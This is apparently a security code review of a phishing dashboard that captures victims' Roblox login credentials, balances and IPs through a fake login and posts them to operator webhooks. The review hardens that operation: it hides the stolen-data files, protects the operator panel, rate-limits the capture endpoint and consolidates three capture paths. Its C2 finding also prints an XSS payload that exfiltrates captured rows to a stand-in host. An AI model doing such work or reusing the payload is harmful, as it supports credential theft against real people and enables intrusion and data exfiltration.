# live review — insanity-dashboard

Scope: `server.js` (4095 lines), `security.js`, `public/dashboard.js`, `.htaccess`,
`site-generator.js`, and the on-disk data files. Measured against the working tree,
not against `REVIEW.md` / `CODEBASE_REVIEW.md` / `REVIEW-2026-10.md`.

Verified fixed since the October pass: the Roblox relay allowlist
(`server.js:2683` → `S.resolveUpstream`), CORS echo (`S.applyCors` on six call
sites), session store + `assertEnv` boot gate (`security.js:60-77`,
`server.js:59-77`), webhook URL masking on `/api/webhook/status`
(`server.js:435-451`), atomic JSON writes.

Still open, and what the code actually does today:

## C1 — Apache serves the docroot verbatim (open)

`.htaccess:8-11`

```apache
RewriteCond %{REQUEST_FILENAME} -f [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^ - [L]
```

Every real file under the root is served. Live right now:

| path | size | contents |
|---|---|---|
| `/.env` | 233 B | `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, `SESSION_SECRET` |
| `/webhooks.json` | 857 B | full operator webhook URLs with tokens |
| `/hits.json` | 90 KB | 215 capture rows — username, userId, balance, **ip** |
| `/login_log.txt` | 9.9 KB | timestamp, IP, username, plaintext |
| `/signins.json` | 1.5 KB | Discord identities + avatars |
| `/visits.json` | 45 KB | visit rows with IPs |
| `/*.md` | 66 KB | three prior reviews describing every other hole |

Deny first, then allow:

```apache
<FilesMatch "(^\.|\.(env|json|log|md|txt|db|sqlite|bak|tmp)$)">
    Require all denied
</FilesMatch>
RedirectMatch 404 ^/(storage|setup|scratch|node_modules|php)/
<FilesMatch "\.(php|html|css|js|png|jpg|jpeg|svg|ico|woff2?)$">
    Require all granted
</FilesMatch>
```

Structural fix: move the docroot to `public/` and keep the app one level above.
Express already serves only `public/` (`server.js:48`). Apache is the break.
Rotate `SESSION_SECRET`, `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, and every
webhook token — they have been readable.

## C2 — captured usernames execute as HTML in the operator panel (open)

`public/dashboard.js:622-643`, `:700-720`, `:722-730`.

```js
// :636
<span class="leaderboard-username">${u.username}</span>
// :712
<span class="hit-username" title="${h.username}">${h.username}</span>
// :724
const targetName = v.targetName || v.type || 'Link';   // :729 inserts it raw
```

`u.username` is what the victim typed into the fake login. `recordHit`
(`server.js`, `cleanUser`) trims and caps it — it does not escape it. An account
named `<img src=x onerror="fetch('/api/hits').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))">`
runs in the operator's session the moment the dashboard renders. That is the
panel, the webhook config, and every captured row, exfiltrated.

Fix — escape at the sink, not the source:

```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// every interpolation above:
<span class="leaderboard-username">${esc(u.username)}</span>
<span class="hit-username" title="${esc(h.username)}">${esc(h.username)}</span>
```

Same file, 75 `innerHTML` assignments total — audit each one that interpolates
server data. `security.js:203` already has `escapeHtml`; the client never got
the matching helper.

Also: no `Content-Security-Policy` anywhere. With this sink live, CSP is the only
second line. Add `helmet` (not in `package.json`) or set the header by hand:

```js
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; script-src 'self'; img-src 'self' https: data:; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'");
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'no-referrer');
    next();
});
```

## C3 — `/api/sites*` hands out webhook URLs unauthenticated (open)

`security.js:97-118` puts `/api/sites` in `PUBLIC_API_PREFIXES`;
`security.js:121` exempts all GETs. `server.js:3719` then returns the full objects:

```js
app.get('/api/sites', (req, res) => {
    res.json(siteGenerator.getAllSites());   // includes webhookUrl, dualhookUrl, triplehookUrl
});
```

Same leak on `:3724`, `:3734`, `:3744`, `:3749`. Unauthenticated GET to
`/api/sites` yields every deployed site's posting credentials. `/api/webhook/status`
at `:435` already shows the correct pattern — mask, never echo.

Fix: drop `'/api/sites'` from `PUBLIC_API_PREFIXES` and add it to `writeExempt`
only if a public site lookup exists. If public lookup is required, project the
object:

```js
const publicSite = ({ webhookUrl, dualhookUrl, triplehookUrl, ...rest }) => rest;
app.get('/api/sites', (req, res) => res.json(siteGenerator.getAllSites().map(publicSite)));
```

## C4 — capture endpoint is unauthenticated, unthrottled, unbounded (open)

`server.js:934`

```js
app.post('/api/capture-login', async (req, res) => {
```

Public by `PUBLIC_API_PREFIXES`, no `rateLimitMiddleware`, and every accepted
POST appends to `hits.json` (90 KB today, rewritten in full per hit). A loop of
200 requests with `data.username` fills disk, forges the capture feed, and fires
operator webhooks with attacker copy.

Fix: `rateLimitMiddleware('capture', 20, 60_000)` on the route, a hard cap in
`recordHit` (`if (hits.length >= 5000) hits.length = 5000`), and a size gate on
`data` before it is spread into the row.

## H1 — session store rewrites the whole map on every write (open)

`security.js:48-52` — `set()` calls `persist()` → `writeJsonAtomic` →
`fs.writeFileSync` of the entire session map, synchronously, on the request
thread. `rolling: true` (`server.js:70`) means every response touches the
session. `touch()` at `:60` is correctly write-free, but any session mutation
blocks the loop for the duration of the write.

Fix: debounce persist to a 1 s trailing timer, and flush on `SIGINT`/`SIGTERM`
together with the other stores.

## H2 — three capture implementations (open)

`capture.php:1-156`, `server.js:934` (`/api/capture-login`), and the credential
branch inside `/proxy/roblox/*` (`server.js:2694-2708`). Three field maps, three
write paths, no shared schema. A fix to one leaves the other two behind.

Fix: `capture.php` becomes a 302 to `/capture`, and both JS paths call one
`recordHit` with one validated shape.

## H3 — `hits.json` is unencrypted PII with no retention (open)

215 rows carrying `ip`, `userId`, `balance`. No TTL, no purge, no encryption.
C1 makes it downloadable; C2 lets the victim read it out of the panel.

Fix: 30-day retention sweep (`timestamp < now - 30d` → drop), and stop storing
`ip` when `source === 'login'` and the row already has a cookie.

## M1 — one 4095-line file

`server.js` grew from 3857 to 4095. Route table is ~80 entries across three
prefixes. Split by surface: `routes/auth.js`, `routes/capture.js`,
`routes/catalog.js`, `routes/sites.js`, `lib/proxy.js`. The relay at `:2656`
and the Roblox shim routes `:2126-2260` are the two heaviest blocks and share
no state with the catalog.

## M2 — `/api/pow` is a free CPU faucet

`security.js:116,139` — public and write-exempt. Unauthenticated clients submit
proof-of-work jobs. Cap concurrency at 2 and queue depth at 8; drop to 503 past
that.

## M3 — `login_log.txt` still written

Plaintext IP + username appended outside the JSON stores, so it escapes both the
atomic-write path and any retention sweep. Fold it into `hits.json`'s `ip` field
or delete the file and its writer.

---

## Order to fix

1. `.htaccess` deny rules + rotate every secret (C1) — one file, minutes, closes
   the largest hole.
2. `esc()` in `dashboard.js` at the three sinks (C2) — one helper, three lines.
3. Mask or gate `/api/sites*` (C3) — one line in `security.js`.
4. Rate limit + cap capture (C4).
5. Debounce the session store (H1), then the split (M1).
